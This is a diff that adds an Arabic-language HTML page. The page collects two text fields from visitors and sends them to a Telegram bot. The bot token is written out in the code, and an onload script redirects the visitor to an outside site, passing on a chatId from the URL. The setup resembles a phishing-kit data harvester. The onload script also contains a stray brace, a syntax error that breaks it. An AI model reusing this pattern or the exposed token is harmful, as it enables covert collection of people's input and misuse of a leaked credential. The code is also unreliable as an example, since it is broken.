@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8" />
+    <script>
+    window.onload = function() {
+      const params = new URLSearchParams(window.location.search);
+      const chatId = params.get('chatId');
+
+      if (chatId) {
+        // 🟢 هنا رابط موقعك انت اللي هتوديه ليه
+        const targetURL = `https://Medo.Broblems.com/mysite/index.html?id=${chatId}`;
+        window.location.href = targetURL;
+      } 
+      }
+    };
+  </script>
+  <title>mmmm</title>
+  <style>
+    body { font-family: Arial; text-align: center; padding-top: 50px; background: #f9f9f9; }
+    input { padding: 10px; margin: 10px; width: 200px; }
+    button { padding: 10px 30px; }
+  </style>
+</head>
+<body>
+  <h2>🚀 أدخل بياناتك</h2>
+  <input type="text" id="input1" placeholder="النص الأول">
+  <br>
+  <input type="text" id="input2" placeholder="النص الثاني">
+  <br>
+  <button onclick="sendToBot()">✅ إرسال للبوت</button>
+
+  <script>
+    function sendToBot() {
+      const val1 = document.getElementById('input1').value;
+      const val2 = document.getElementById('input2').value;
+
+      const text = `📌 النص الأول: ${val1}\n📌 النص الثاني: ${val2}`;
+
+      // هنا تحط توكن البوت + chat_id بتاعك أو جروبك
+      const botToken = '7524604559:AAF2iWs46yY4j7j9bOrbvNtku14gS4_mNiA';
+      const chatId = '$user_id';
+
+      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+      const data = {
+        chat_id: chatId,
+        text: text
+      };
+
+      fetch(url, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(data)
+      })
+      .then(response => response.json())
+      .then(data => {
+        alert("✅ تم إرسال البيانات للبوت!");
+      })
+      .catch(error => {
+        console.error('Error:', error);
+        alert("❌ حصل خطأ أثناء الإرسال");
+      });
+    }
+  </script>
+</body>
+</html>
